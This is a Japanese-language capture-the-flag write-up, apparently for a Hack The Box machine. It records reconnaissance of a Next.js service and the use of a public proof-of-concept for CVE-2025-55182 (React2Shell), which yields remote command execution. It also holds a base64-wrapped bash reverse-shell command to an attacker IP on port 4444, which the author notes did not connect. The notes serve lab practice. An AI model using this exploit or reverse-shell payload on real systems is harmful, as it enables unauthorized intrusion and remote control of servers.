# 激むず、解けない
# イージーがつらいよ
|項目|内容
|----|-----|
|ターゲットIP|10.129.12.122|
|port|22(ssh),3000(ppp?)|

1.偵察
```bash
nmap -p22,3000 -sCV 10.129.12.122
```
```bash
curl -s -i http://10.129.12.122:3000 | head -40
```
- curlコマンドの動作がないため以下を使用
  ```bash
  # 接続〜ヘッダまで詳細に表示（最大15秒で打ち切り）
  curl -v --max-time 15 http://10.129.12.122:3000/
  ```
  ```bash
  # ヘッダだけ（ステータス行を確認）
  curl -s -i --max-time 15 http://10.129.12.122:3000/ | head -20
  ```
  ※結果はかわらず
  ```bash
  # HEADなら / でもヘッダだけ返ることが多い
  curl -I --max-time 15 http://10.129.12.122:3000/
  ```
  ```
  HTTP/1.1 200 OK
  Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch,
  Next-Router-Segment-Prefetch, Accept-Encoding
  x-nextjs-cache: HIT
  x-nextjs-prerender: 1
  x-nextjs-stale-time: 4294967294
  X-Powered-By: Next.js
  Cache-Control: s-maxage=31536000,
  ETag: "p02u6gnhufd8t"
  Content-Type: text/html; charset=utf-8
  Content-Length: 17175                  <----- Next.jsの可能性が高い
  Date: Sun, 31 May 2026 11:02:34 GMT
  Connection: keep-alive
  Keep-Alive: timeout=5
  --------------------------------------------------------------------------------
  ● 200 OK、Content-Length: 17175、x-nextjs-prerender: 1、x-nextjs-cache: HIT。/
  は事前レンダリング＋キャッシュ済みでした。最初のGETが固まったのは、初回アクセスでキ
  ャッシュ生成中にタイムアウトしたためと思われます。今はキャッシュが温まった（HIT）の
  で、GETも通るはずです。

  ちなみに Content-Length: 17175 は先日の Reactor と完全一致。同じアプリ（ReactorWatch
  監視システム / Next.js 15系）の可能性が高いです。
  ```

  2.エクスプロイト準備
  ```bash
  msfconsole
  ```
  ```
  # モジュールの有無を確認
  msf>search react2shell
  ```
  ※モジュールが存在しないらしい
  - CVE-2025-55182 / React2Shellはかなり新しい（2025年後半）ため、あなたの msf バージョンに未収録の可能性が高い<br>

  ### *PoCを取得する*
  ```bash
  git clone https://github.com/jensnesten/React2Shell-PoC
  ```
  ```bash
  # 使い方/依存を確認（READMEと引数）
  cat README.md | head -60
  python3 scanner.py -h 2>/dev/null; python3 main.py -h 2>/dev/null
  pip3 install -r requirements.txt 2>/dev/null   # requirements.txtがあれば

  # ① スキャナーで脆弱性確認（HTBはポート3000なので必ず :3000 を付ける）
  python3 scanner.py -u http://10.129.12.122:3000

  # ② RCEでコマンド実行を確認（id）
  python3 main.py http://10.129.12.122:3000 'id'
  ```
  ```
  #①と②の結果
  lqq(miyajikosuke03㉿kali)-[~/React2Shell-PoC]
  mq$ python3 scanner.py -u http://10.129.12.122:3000

  brought to you by assetnote

  [*] Loaded 1 host(s) to scan  
  [*] Using 10 thread(s)
  [*] Timeout: 10s
  [*] Using RCE PoC check
  [!] SSL verification disabled

  [ERROR] http://10.129.12.122:443 - Connection Error: HTTPConnectionPool(host='10.129.12.122', port=443): Max retries exceeded with url: / (Caused by   NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fa9ffab8050>: Failed to establish a new connection: [Errno 111] Connection refused'))

  ============================================================
  SCAN SUMMARY
  ============================================================
  Total hosts scanned: 1
  Vulnerable: 0
  Not vulnerable: 1
  Errors: 0
  ============================================================

  lqq(miyajikosuke03㉿kali)-[~/React2Shell-PoC]
  mq$ python3 main.py http://10.129.12.122:3000 'id'
  [*] Connecting to 10.129.12.122:3000 (http)
  [*] Sending payload with command: id
  [*] Response received, parsing output...
  [+] Command output:
  uid=999(node) gid=988(node) groups=988(node)
  ```
  ※uid=999(node)でRCE成立を確認
  
  3.対話的シェルを取りに行く
  ```bash
  python3 main.py http://10.129.12.122:3000 'uname -a; which bash nc python3 node'
  ```
  ⇒カーネル情報とパスがかえってきた
  ```
  [*] Connecting to 10.129.12.122:3000 (http)
  [*] Sending payload with command: uname -a; which bash nc python3 node
  [*] Response received, parsing output...
  [+] Command output:
  Linux reactor 6.8.0-117-generic #117-Ubuntu SMP PREEMPT_DYNAMIC Tue May  5 19:26:24 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
  /usr/bin/bash
  /usr/bin/nc
  /usr/bin/python3
  /usr/bin/node
  ```
  4.別ターミナルでリスナーを貼る
  ```bash
  nc -lvnp 4444
  ```
  5.リバースシェルを発火する
  ```
  quoting事故を避けるため base64 で渡します：
  PAYLOAD='bash -i >& /dev/tcp/10.10.14.91/4444 0>&1'
  B64=$(printf '%s' "$PAYLOAD" | base64 -w0)
  python3 main.py http://10.129.12.122:3000 "bash -c 'echo $B64 | base64 -d | bash'"
  ```
  ※ncに接続できず
  
